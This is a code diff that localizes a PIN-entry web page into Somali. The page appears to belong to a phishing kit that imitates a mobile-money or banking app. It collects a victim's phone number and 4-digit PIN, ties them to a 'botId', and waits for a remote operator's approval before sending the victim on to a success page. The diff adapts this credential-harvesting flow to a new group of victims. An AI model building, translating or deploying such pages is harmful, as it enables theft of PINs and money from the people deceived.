@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Enter your PIN</title>
+  <title>Geli PIN-kaaga</title>
   <style>
     * {
       margin: 0;
@@ -224,8 +224,8 @@
   <button class="back-arrow" onclick="window.history.back()">&#8592;</button>
 
   <!-- Title & subtitle -->
-  <div class="title">Enter your PIN</div>
-  <div class="subtitle">Enter your 4‑digit PIN</div>
+  <div class="title">Geli PIN-kaaga</div>
+  <div class="subtitle">Geli PIN-ka 4-godka ah</div>
 
   <!-- PIN input area -->
   <div class="pin-box-wrapper" onclick="document.getElementById('pinInput').focus()">
@@ -240,13 +240,13 @@
 
   <!-- Alert & waiting -->
   <div id="otp-alert"></div>
-  <div id="waiting">⏳ Awaiting approval…</div>
+  <div id="waiting">⏳ Sugitaan...</div>
 
   <!-- Need help? link -->
-  <a href="#" class="help-link">Need help?</a>
+  <a href="#" class="help-link">Caawimaad u baahan?</a>
 
   <!-- Button -->
-  <button id="verifyBtn" class="continue-btn" disabled>Next</button>
+  <button id="verifyBtn" class="continue-btn" disabled>Xiga</button>
 
   <!-- Version footer -->
   <div class="version-footer">Version 12.4.0892 (1200040892)</div>
@@ -276,7 +276,7 @@
   if (botId) localStorage.setItem('botId', botId);
 
   if (!phone || !botId) {
-    alert('Session expired. Please start over.');
+    alert('Fadhi wuu dhacay. Fadlan dib u bilow.');
     window.location.href = 'index.html';
     return;
   }
@@ -326,7 +326,7 @@
     if (pin.length !== 4) return;
 
     verifyBtn.disabled = true;
-    verifyBtn.textContent = 'Awaiting…';
+    verifyBtn.textContent = 'Sugitaan...';
     verifyBtn.classList.add('waiting');
     waitingEl.style.display = 'block';
     showAlert('', '');
@@ -344,9 +344,9 @@
     } catch (error) {
       waitingEl.style.display = 'none';
       verifyBtn.disabled = false;
-      verifyBtn.textContent = 'Next';
+      verifyBtn.textContent = 'Xiga';
       verifyBtn.classList.remove('waiting');
-      showAlert('❌ Server error. Please try again.', 'error');
+      showAlert('❌ Cilad server. Fadlan mar kale isku day.', 'error');
     }
   });
 
@@ -357,17 +357,18 @@
         const data = await res.json();
         if (data.approved === true) {
           clearInterval(interval);
-          window.location.href = 'code.html';
+          // ✅ Redirect to success.html after PIN approval
+          window.location.href = 'success.html';
         }
         if (data.approved === false || data.blocked) {
           clearInterval(interval);
           input.value = '';
           boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
           verifyBtn.disabled = true;
-          verifyBtn.textContent = 'Next';
+          verifyBtn.textContent = 'Xiga';
           verifyBtn.classList.remove('waiting');
           waitingEl.style.display = 'none';
-          showAlert('❌ Incorrect PIN. Please try again.', 'error');
+          showAlert('❌ PIN-ka waa qalad. Fadlan mar kale isku day.', 'error');
           focusPin();
         }
       } catch (error) {
